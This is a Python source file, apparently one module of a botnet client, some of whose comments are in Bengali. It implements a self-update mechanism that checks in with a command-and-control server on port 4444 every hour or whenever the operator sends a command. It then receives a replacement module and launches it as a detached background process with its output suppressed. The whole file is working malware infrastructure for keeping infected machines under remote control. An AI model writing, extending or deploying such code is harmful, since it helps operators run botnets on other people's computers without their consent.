# modules/auto_update.py

"""
Auto-Update Module for Bot Client
=================================
* Auto check every hour (3600 seconds)
* Manual update from C2 command
* No duplicate updates
* Downloads and installs update file with confirmation
"""

import os
import sys
import time
import threading
import subprocess
import platform
import tempfile
import json
import base64
import shutil
from typing import Optional, Tuple

# Import from config
try:
    from config import BOT_NAME, C2_IP, C2_PORT
    UPDATE_INTERVAL = 3600
except ImportError:
    BOT_NAME = "botnet"
    C2_IP = "127.0.0.1"
    C2_PORT = 4444
    UPDATE_INTERVAL = 3600

def log(msg: str, level="INFO"):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {msg}")


class AutoUpdater:
    def __init__(self, bot_client=None):
        self.bot_client = bot_client
        self.current_version = "1.0.0"
        self.script_path = sys.argv[0]
        self.temp_dir = tempfile.gettempdir()
        self._stop_flag = False
        self._update_in_progress = False
        self._last_update_time = 0
        self._update_result = None
        self._download_progress = 0

    def set_bot_client(self, bot_client):
        self.bot_client = bot_client

    def _send_to_c2(self, command: str) -> bool:
        """C2-তে কমান্ড পাঠান"""
        if not self.bot_client:
            log("[-] No bot client reference", "ERROR")
            return False

        try:
            if hasattr(self.bot_client, '_send'):
                result = self.bot_client._send(command)
                if result:
                    log(f"[+] Command sent to C2: {command}")
                    return True
                else:
                    log("[-] Failed to send command to C2", "WARNING")
                    return False
            else:
                log("[-] Bot client has no _send method", "ERROR")
                return False

        except Exception as e:
            log(f"[-] Send error: {e}", "ERROR")
            return False

    def _download_and_install(self) -> Tuple[bool, str]:
        """Download and install update file with confirmation"""
        try:
            log("[+] Downloading update file from C2...")

            # Send DOWNLOAD command to C2
            if not self._send_to_c2("DOWNLOAD modules/auto_update.py"):
                return False, "Failed to send DOWNLOAD command"

            # Wait for download with progress
            downloaded = False
            for i in range(15):  # 15 seconds timeout
                time.sleep(1)
                if os.path.exists("modules/auto_update.py"):
                    file_size = os.path.getsize("modules/auto_update.py")
                    if file_size > 100:  # Valid file size
                        downloaded = True
                        break
                if i % 3 == 0:
                    progress = min(i // 3 + 1, 5)
                    log(f"[*] Downloading... [{'█' * progress}{'░' * (5 - progress)}]")

            if not downloaded:
                return False, "Download timeout - file not received"

            file_size = os.path.getsize("modules/auto_update.py")
            log(f"[+] Update file downloaded successfully! ({file_size:,} bytes)")

            # Verify file content
            try:
                with open("modules/auto_update.py", 'r', encoding='utf-8') as f:
                    content = f.read()
                    if len(content) < 50:
                        return False, "Downloaded file seems corrupted"
                log("[+] File integrity verified")
            except Exception as e:
                return False, f"File verification failed: {e}"

            # Send installation started
            self._send_to_c2("UPDATE_INSTALLATION_STARTED")

            # Install update
            log("[+] Installing update...")

            if platform.system() == "Windows":
                subprocess.Popen(
                    ["python", "modules/auto_update.py"],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                log("[+] New bot instance started in new console")
            else:
                subprocess.Popen(
                    ["python3", "modules/auto_update.py"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True
                )
                log("[+] New bot instance started in background")

            # Send success confirmation to C2
            self._send_to_c2("UPDATE_INSTALLED_SUCCESSFULLY")

            # Show summary
            log("[+] ✅ Update installed successfully!")
            log(f"[+] 📦 File: modules/auto_update.py ({file_size} bytes)")
            log(f"[+] 🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")

            return True, f"Update installed successfully ({file_size} bytes)"

        except Exception as e:
            error_msg = f"Update installation failed: {e}"
            log(f"[-] {error_msg}", "ERROR")
            self._send_to_c2(f"UPDATE_INSTALLATION_ERROR: {e}")
            return False, error_msg

    def check_update(self) -> Tuple[bool, str]:
        """
        C2-তে UPDATE কমান্ড পাঠায় এবং আপডেট ডাউনলোড করে
        Returns: (success, message)
        """
        if not self.bot_client:
            return False, "No bot client reference"

        if self._update_in_progress:
            return False, "Update already in progress"

        current_time = time.time()
        if current_time - self._last_update_time < 5:
            return False, "Update check too frequent"

        self._update_in_progress = True
        self._last_update_time = current_time

        try:
            # Send UPDATE command to C2
            if not self._send_to_c2("UPDATE"):
                self._update_in_progress = False
                return False, "Failed to send update command"

            log("[+] Update check sent to C2")

            # Wait for response from C2
            time.sleep(2)

            # Check if update available (C2 will send UPDATE_AVAILABLE)
            if hasattr(self.bot_client, 'command_queue'):
                try:
                    import queue
                    response = None
                    try:
                        response = self.bot_client.command_queue.get(timeout=3)
                    except queue.Empty:
                        pass

                    if response == "UPDATE_AVAILABLE":
                        log("[+] Update available, downloading...")
                        success, msg = self._download_and_install()
                        self._update_in_progress = False
                        self._update_result = "success" if success else "failed"
                        return success, msg

                    elif response == "No update available":
                        log("[+] No update available")
                        self._update_in_progress = False
                        self._update_result = "none"
                        return False, "No update available"

                except Exception as e:
                    log(f"[-] Queue error: {e}", "WARNING")

            self._update_in_progress = False
            return True, "Update check initiated"

        except Exception as e:
            log(f"[-] Update check error: {e}", "ERROR")
            self._update_in_progress = False
            self._update_result = "error"
            return False, f"Update error: {e}"

    def manual_update(self) -> Tuple[bool, str]:
        """ম্যানুয়াল UPDATE - C2 থেকে কমান্ড আসলে"""
        if self._update_in_progress:
            return False, "Update already in progress"

        log("[+] Manual update triggered by C2")
        return self.check_update()

    def get_update_result(self) -> Optional[str]:
        """সর্বশেষ UPDATE রেজাল্ট পান"""
        return self._update_result

    def run_auto_loop(self):
        """অটো-আপডেট লুপ - প্রতি ঘন্টায় চেক করে"""
        log(f"[+] Auto-Update Module Started (Interval: {UPDATE_INTERVAL}s)")

        while not self._stop_flag:
            try:
                if not self._update_in_progress:
                    success, msg = self.check_update()
                    if success:
                        log(f"[+] Auto update: {msg}")
                    else:
                        log(f"[-] Auto update: {msg}")
                else:
                    log("[*] Update in progress, skipping auto check")

                for _ in range(UPDATE_INTERVAL):
                    if self._stop_flag:
                        break
                    time.sleep(1)

            except Exception as e:
                log(f"[-] Update loop error: {e}", "ERROR")
                time.sleep(UPDATE_INTERVAL)

    def stop(self):
        self._stop_flag = True
        log("[+] Auto-Update stopped")


_updater = None

def start_auto_update(bot_client=None):
    """অটো-আপডেট থ্রেড শুরু করুন"""
    global _updater

    if bot_client is None:
        log("[!] Auto-update skipped (no bot client reference)", "WARNING")
        return

    if _updater:
        _updater.stop()
        time.sleep(1)

    _updater = AutoUpdater(bot_client)
    thread = threading.Thread(target=_updater.run_auto_loop, daemon=True)
    thread.start()
    log("[+] Update Thread Started")
    return _updater


def manual_update(bot_client=None) -> Tuple[bool, str]:
    """ম্যানুয়াল UPDATE - C2 থেকে কল করা হবে"""
    global _updater

    if bot_client is None:
        return False, "No bot client reference"

    if _updater is None:
        _updater = AutoUpdater(bot_client)
    else:
        _updater.set_bot_client(bot_client)

    return _updater.manual_update()


def get_updater():
    return _updater


def stop_auto_update():
    """অটো-আপডেট থ্রেড বন্ধ করুন"""
    global _updater
    if _updater:
        _updater.stop()
        _updater = None
        log("[+] Auto-Update stopped")


def get_update_status() -> dict:
    """আপডেট স্ট্যাটাস দেখান"""
    global _updater
    if _updater:
        return {
            'running': not _updater._stop_flag,
            'update_in_progress': _updater._update_in_progress,
            'last_update': _updater._last_update_time,
            'interval': UPDATE_INTERVAL,
            'last_result': _updater._update_result
        }
    return {
        'running': False,
        'update_in_progress': False,
        'last_update': 0,
        'interval': UPDATE_INTERVAL,
        'last_result': None
    }


if __name__ == "__main__":
    print("Testing Auto-Update Module...")
    start_auto_update()
    time.sleep(3)
    print(f"Status: {get_update_status()}")
    success, msg = manual_update()
    print(f"Manual update: {success} - {msg}")
    time.sleep(5)
    stop_auto_update()
    print("Test complete!")
